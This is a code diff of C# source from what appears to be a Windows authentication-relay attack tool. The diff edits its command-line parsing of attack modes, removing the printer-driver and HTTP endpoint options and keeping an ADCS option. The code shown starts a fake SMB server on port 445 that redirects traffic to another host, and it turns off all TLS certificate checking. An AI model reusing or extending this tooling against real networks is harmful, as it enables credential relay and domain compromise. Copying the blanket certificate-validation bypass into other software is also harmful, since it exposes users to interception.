@@ -421,35 +421,9 @@ byte[] securityBlob = new byte[securityBufferLength];
                         }
                         break;
 
-                    case "-ADD-PRINTERDRIVER":
-                    case "/ADD-PRINTERDRIVER":
-                        try
-                        {
-                            attacks.Add("add-priverdriver", args[entry.index + 1]);
-                        }
-                        catch
-                        {
-                            Console.WriteLine("[-] -add-priverdriver requires an argument");
-                            return;
-                        }
-                        break;
-
+                    
                     // http attacks
-                    case "-ENDPOINT":
-                    case "/ENDPOINT":
-                        try
-                        {
-                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
-                                throw new Exception();
-                            attacks.Add("endpoint", args[entry.index + 1]);
-                        }
-                        catch
-                        {
-                            Console.WriteLine("[-] -endpoint requires an argument");
-                            return;
-                        }
-                        break;
-
+                 
                     case "-ADCS":
                     case "/ADCS":
                         try
@@ -551,7 +525,6 @@ byte[] securityBlob = new byte[securityBufferLength];
                     Console.WriteLine("[-] -endpoint parameter is required for HTTP");
                     return;
                 }
-                //handler = new HttpClientHandler() { PreAuthenticate = false, UseCookies = false };
                 ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
                 handler = new HttpClientHandler() { UseDefaultCredentials = false, PreAuthenticate = false, UseCookies = true };
 
@@ -565,15 +538,11 @@ byte[] securityBlob = new byte[securityBufferLength];
 
             }
 
-            //Console.WriteLine("[*] Socket Server Start: {0}", ListenerPort);
-            //tcpFwd.StartPortFwd("192.168.1.79", "445", "192.168.212.44", "445");
-            //tcpFwd = new FakeSMBServer(445, RedirectHost, 445);
+           
              SMBtcpFwd = new FakeSMBServer(445, RedirectHost, 445, "SMB");
             forwdardmode = false;
             SMBtcpFwd.Start(false);
-            /*DCOMtcpFwd = new FakeSMBServer(9999, RedirectHost, 135, "DCOM");
-            Task.Run(() => DCOMtcpFwd.Start(false));*/
-
+           
             List<FakeSMBServer> tcpForwarders = new List<FakeSMBServer>();
 
             if (RedirectPorts != null)
